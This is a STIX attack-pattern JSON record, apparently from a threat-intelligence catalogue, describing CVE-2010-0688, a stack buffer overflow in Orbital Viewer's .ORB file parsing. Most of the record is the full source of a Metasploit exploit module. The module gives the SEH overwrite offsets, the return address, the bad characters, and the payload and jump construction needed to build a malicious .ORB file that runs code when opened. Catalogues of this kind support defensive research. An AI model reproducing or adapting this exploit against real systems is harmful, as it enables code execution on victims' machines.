{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23ccb7aa-6f62-487d-9ec9-ae6d4c880484",
    "created": "2024-08-14T16:37:53.6681Z",
    "modified": "2024-08-14T16:37:53.668104Z",
    "name": "Orbital Viewer ORB File Parsing Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in David Manthey's Orbital Viewer. When processing .ORB files, data is read from file into a fixed-size stack buffer using the fscanf function. Since no bounds checking is done, a buffer overflow can occur. Attackers can execute arbitrary code by convincing their victim to open an ORB file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/orbital_viewer_orb.rb",
            "external_id": "orbital_viewer_orb.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0688"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-011-orbital-viewer-orb-buffer-overflow/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Orbital Viewer ORB File Parsing Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in David Manthey's\n        Orbital Viewer. When processing .ORB files, data is read from file into\n        a fixed-size stack buffer using the fscanf function. Since no bounds\n        checking is done, a buffer overflow can occur. Attackers can execute\n        arbitrary code by convincing their victim to open an ORB file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t     => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'BID', '38436' ],\n          [ 'OSVDB', '62580' ],\n          [ 'CVE', '2010-0688' ],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-011-orbital-viewer-orb-buffer-overflow/' ],\n          [ 'EDB', '11581' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'BadChars'    => \"\\x00\\x09\\x0a\\x0d\\x20\", # \\xbd was safe in my test, \\x09 was not\n          'DisableNops' => true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Orbital Viewer 1.04 on Windows XP SP3',\n            {\n              'Ret' => 0x004032a2, # p/p/r in ov.exe v1.0.0.2\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-02-27',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.orb']),\n      ])\n  end\n\n  def exploit\n\n    # One for double-click\n    seh1 = 3968\n    # One for DnD and File->Open\n    seh2 = seh1 + 2092\n\n    sploit = \"OrbitalFileV1.0\\r\\n\"\n\n    line2 = ''\n    nop_count = seh1 - payload.encoded.length\n    line2 << make_nops(nop_count)\n    line2 << payload.encoded\n\n    line2 << generate_seh_record(target.ret)\n    distance = seh1 + 8\n    line2 << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    line2 << rand_text_alphanumeric(seh2 - line2.length)\n    line2 << generate_seh_record(target.ret)\n    distance = seh2 + 8\n    line2 << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    # Crash writing past end of stack...\n    line2 << rand_text_alphanumeric(1024) * 20\n\n    sploit << line2\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-27",
    "x_mitre_platforms": [
        "win'"
    ]
}